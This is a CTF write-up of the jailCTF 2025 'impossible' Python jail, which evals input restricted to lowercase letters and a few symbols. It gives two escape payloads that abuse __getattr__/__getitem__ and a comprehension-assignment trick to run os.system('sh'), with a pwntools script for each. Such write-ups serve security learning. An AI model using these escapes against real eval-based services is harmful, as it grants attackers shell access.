# jailCTF 2025 impossible

```python
#!/usr/local/bin/python3
eval(''.join(c for c in input('> ') if c in "abcdefghijklmnopqrstuvwxyz:_.[]"))
```

Requirements:

1. No parens: use `obj.__class__.__getitem__ = func` and `obj[arg]` to call function
2. No spaces or equal signs: use `[[]for[a]in[[b]]]` instead of `a = b`
3. No strings: set `obj.__class__.__getattr__ = __import__` and `obj.os` to import `os`

## Solution 1: __import__('os').system('sh')

Writeup by @Coppermine on Discord:

```python
[[copyright.sh]for[[[copyright.__class__.__getattr__]]]in[[[[copyright.os.system]for[copyright.__class__.__getattr__]in[[__import__]]]]]]
```

The idea here is to utilize that `a.b` is essentially `a.__class__.__getattr__("b")`, so we can pass string arguments without quotes.

Attack script:

```python
from pwn import *

# solution #1
p = process(["python3", "main.py"])
# __import__('os').system('sh')
p.sendline(
    b"[[copyright.sh]for[[[copyright.__class__.__getattr__]]]in[[[[copyright.os.system]for[copyright.__class__.__getattr__]in[[__import__]]]]]]"
)
p.interactive()
```

## Solution 2: eval(input(license))

Writeup by @xtea418 on Discord:

```python
[[help[quit[license]]]for[help.__class__.__getitem__]in[[eval]for[quit.__class__.__getitem__]in[[input]]]]
```

The idea is to call functions with parens using `[[]for[a]in[[b]]]` primitive. Previously in [pyjail cheatsheet](shirajuki.js.org/blog/pyjail-cheatsheet/) we know that we can do `[[]for a in[b]]`, but the spaces are required. The extra `[]` layer makes it work without spaces.

The rest is simply converting `eval(input(license))` to `help[quit[license]]` where `quit[arg]` calls `input(arg)` and `help[arg]` calls `eval(arg)`.

Attack script:

```python
from pwn import *

# solution #2
p = process(["python3", "main.py"])
# eval(input(license))
p.sendline(
    b"[[help[quit[license]]]for[help.__class__.__getitem__]in[[eval]for[quit.__class__.__getitem__]in[[input]]]]"
)
p.sendline(b"__import__('os').system('sh')")
p.interactive()
```
